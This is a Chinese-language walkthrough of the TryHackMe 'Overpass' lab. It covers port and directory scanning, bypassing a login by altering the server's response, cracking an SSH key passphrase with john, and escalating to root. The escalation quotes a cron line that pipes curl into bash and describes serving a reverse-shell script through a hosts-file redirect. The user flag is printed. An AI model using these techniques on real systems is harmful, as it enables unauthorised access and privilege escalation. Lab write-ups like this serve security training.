---
title: tryhackme - Overpass
---

```
Target ip :10.10.105.142
```

### 扫描开放端口：
```bash
└─$ nmap -sS -Pn -T4 10.10.105.142

Nmap scan report for 10.10.105.142
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### 访问80端口：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250709180205031.png)


### 对站点进行目录扫描：
```bash

└─$ python dirsearch.py -u http://10.10.105.142/ -i 200 

Target: http://10.10.105.142/

[06:06:39] Starting:                                                                                     
[06:07:08] 200 -  782B  - /404.html                                         
[06:07:18] 200 -    1KB - /admin.html                                       
[06:07:18] 200 -    1KB - /admin/                                           
[06:08:03] 200 -    2KB - /downloads/                                       
[06:08:27] 200 -    2KB - /login.js                                         
[06:08:29] 200 -   28B  - /main.js   

```

### 访问http://10.10.105.142/login.js：
```js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
#### 可以看到，如果登陆返回的statusOrCookie === "Incorrect credentials"，则显示登陆失败，否则跳转到adminstatusOrCookie === "Incorrect credentials"页面
#### 那么，抓包并修改返回值Incorrect credentials，成功登陆阳台：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250709181813152.png)

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250709182059844.png)
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250709182125770.png)

### 将admin页面的RSA 文件保存到本地命名为id_rsa，并使用john破解密码,得到密码  james13：
```bash
└─$ ssh2john ./id_rsa > id_rsa.hash                               
                                                                                                         
(base) ┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (./id_rsa)     
1g 0:00:00:00 DONE (2025-07-09 06:27) 25.00g/s 334400p/s 334400c/s 334400C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
 
### 使用密钥连接ssh:
 ```bash
 └─$ sudo ssh james@10.10.105.142 -i id_rsa

Enter passphrase for key 'id_rsa': 

james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
```

#### 查看todo.txt:
```bash
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```
#### 提示定时任务，所以去查看/etc/crontab:
```bash
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```

#### 可以看到执行了一个buildscript.sh，并且是从`overpass.thm/downloads/src`下载的
#### 查看hosts文件，发现`overpass.thm`的解析地址是本地：
```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```
#### 尝试将hosts解析修改成自己攻击ip,并在本地开启http服务，放置一个`buildscript.sh`，`buildscript.sh`设置反向shell命令，并开启监听,成功获得root shell：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250709184721131.png)
